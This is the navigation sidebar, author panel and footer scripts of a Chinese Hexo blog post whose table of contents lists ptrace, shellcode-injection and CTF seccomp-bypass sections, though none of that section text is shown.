class="nav-link" href="#1-6-3-3-Traced%E7%8A%B6%E6%80%81%E2%80%94%E2%80%94%E5%85%A5%E9%97%A8%E4%BE%8B%E5%AD%90"><span class="nav-number">1.6.3.3.</span> <span class="nav-text">1.6.3.3 Traced状态——入门例子</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-6-3-3-1-wait-status-%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%AE%8F"><span class="nav-number">1.6.3.3.1.</span> <span class="nav-text">1.6.3.3.1 wait(&amp;status)以及相关宏</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-6-3-3-2-PTRACE-SYSCALL%E4%B8%8Ewhile%E5%BE%AA%E7%8E%AF"><span class="nav-number">1.6.3.3.2.</span> <span class="nav-text">1.6.3.3.2 PTRACE_SYSCALL与while循环</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-6-3-3-3-%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C%E8%A7%A3%E6%9E%90"><span class="nav-number">1.6.3.3.3.</span> <span class="nav-text">1.6.3.3.3 运行结果解析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-3-4-Traced%E7%8A%B6%E6%80%81%E2%80%94%E2%80%94%E8%BF%9B%E9%98%B6%E4%BE%8B%E5%AD%90"><span class="nav-number">1.6.3.4.</span> <span class="nav-text">1.6.3.4 Traced状态——进阶例子</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-6-3-4-1-%E8%BF%87%E6%BB%A4execve%E7%9A%84%E6%A1%86%E6%9E%B6"><span class="nav-number">1.6.3.4.1.</span> <span class="nav-text">1.6.3.4.1 过滤execve的框架</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-6-3-4-2-%E4%BC%98%E5%8C%96%E4%BB%A3%E7%A0%81"><span class="nav-number">1.6.3.4.2.</span> <span class="nav-text">1.6.3.4.2 优化代码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-6-3-4-3-%E4%B8%BA%E4%BB%80%E4%B9%88%E5%AD%90%E8%BF%9B%E7%A8%8B%E4%BF%A1%E5%8F%B7%E4%B8%80%E7%9B%B4%E6%98%AF5%EF%BC%89SIGTRAP"><span class="nav-number">1.6.3.4.3.</span> <span class="nav-text">1.6.3.4.3 为什么子进程信号一直是5）SIGTRAP</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-7-%E8%BF%9B%E7%A8%8B%E6%A0%88%E4%B8%8E%E8%BF%9B%E7%A8%8B%E5%A0%86-%E7%BA%BF%E7%A8%8B%E6%A0%88%E5%92%8C%E7%BA%BF%E7%A8%8B%E5%A0%86"><span class="nav-number">1.7.</span> <span class="nav-text">1.7 进程栈与进程堆 线程栈和线程堆</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0X2-ptrace%E7%9A%84shellcode%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">0X2 ptrace的shellcode注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 相关原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 技术解析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-1-shellcode%E5%AD%98%E6%94%BE%E5%9C%A8%E5%93%AA%E9%87%8C"><span class="nav-number">2.2.1.</span> <span class="nav-text">2.2.1 shellcode存放在哪里</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-2-%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8Cshellcode"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.2.2 如何执行shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-3-%E9%9A%90%E8%97%8Fshellcode%E6%89%A7%E8%A1%8C"><span class="nav-number">2.2.3.</span> <span class="nav-text">2.2.3 隐藏shellcode执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-%E5%AF%B9%E5%BA%94%E7%9A%84%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 对应的防御措施</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-4-%E8%83%BD%E5%A4%9F%E8%BF%9B%E8%A1%8C%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 能够进行的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-1-Escape-by-fork"><span class="nav-number">2.4.1.</span> <span class="nav-text">2.4.1 Escape by fork</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-2-Escape-by-Kill"><span class="nav-number">2.4.2.</span> <span class="nav-text">2.4.2 Escape by Kill</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A2%8E%E7%A2%8E%E5%BF%B5"><span class="nav-number">3.</span> <span class="nav-text">碎碎念</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2024nepctf-NepBOX"><span class="nav-number">3.1.</span> <span class="nav-text">2024nepctf NepBOX</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2024-YCB-hard-seccomp"><span class="nav-number">3.2.</span> <span class="nav-text">2024 YCB hard-seccomp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode-v-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">shellcode v.1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode-v-2"><span class="nav-number">3.2.2.</span> <span class="nav-text">shellcode v.2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode-v-3"><span class="nav-number">3.2.3.</span> <span class="nav-text">shellcode v.3</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="xswlhhh"
      src="/images/myavatar.jpg">
  <p class="site-author-name" itemprop="name">xswlhhh</p>
  <div class="site-description" itemprop="description">用最少的时间做无关的事，用最多的时间做紧要的事</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="/2991796382@qq.com" title="E-Mail → 2991796382@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2024-03 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">xswlhhh</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">197k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">2:59</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>



    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
    <span class="post-meta-divider">|</span>
<!-- 不蒜子计数初始值纠正 -->
<script>
$(document).ready(function() {

    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
    var countOffset = 20000;  // 初始化首次数据

    function fixCount() {            
       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
        {
            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
            clearInterval(int);
        }                  
        if ($("#busuanzi_container_site_pv").css("display") != "none")
        {
            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
            clearInterval(int); // 停止检测
        }  
    }
       	
});
</script> 

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script>
NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
  window.livereOptions = {
    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
  };
  (function(d, s) {
    var j, e = d.getElementsByTagName(s)[0];
    if (typeof LivereTower === 'function') { return; }
    j = d.createElement(s);
    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
    j.async = true;
    e.parentNode.insertBefore(j, e);
  })(document, 'script');
});
</script>

</body>
</html>
